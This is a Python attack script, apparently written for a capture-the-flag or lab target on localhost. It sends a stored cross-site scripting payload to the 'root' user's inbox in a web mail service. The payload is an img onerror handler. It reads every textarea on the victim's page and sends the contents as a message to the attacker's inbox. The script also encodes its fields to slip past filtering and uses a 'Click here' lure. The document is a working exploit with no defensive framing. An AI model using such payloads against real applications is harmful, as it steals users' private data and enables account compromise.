
#!/usr/bin/env python3
import requests
import sys
import random

def scramble(s):
    return '-'.join(str(ord(c)) for c in s)

# Super simple payload - just an img tag with onerror
simple_payload = '<img src=x onerror="var d=\'\';document.querySelectorAll(\'textarea\').forEach(function(t){d+=t.value+\'|||\'});var x=new XMLHttpRequest();x.open(\'GET\',\'/$\'+Math.random()+\'?msg=\'+encodeURIComponent(\'EXFIL:\'+d)+\'&to=105-110-104-105-98-105-116-111-114.inbox\');x.send();">'

attacker = "inhibitor"
password = "123456"

message = '{"from":"' + attacker + '","subject":"Click here","date":"2025-10-24","body":"' + simple_payload.replace('"', '\\"') + '"}'
message += '//END_MSG//'

pad_needed = 16 - (len(message) % 16)
if pad_needed > 0 and pad_needed != 16:
    message += '\x00' * pad_needed

rand = str(random.random()).replace('.', '')
url = f"http://localhost:8080/${rand}?pw={scramble(password)}&un={scramble(attacker)}&msg={scramble(message)}&to={scramble('root')}.inbox"

print("Sending simpler XSS payload...")
try:
    requests.get(url, timeout=5)
    print("Sent!")
except:
    print("Sent (connection closed)")
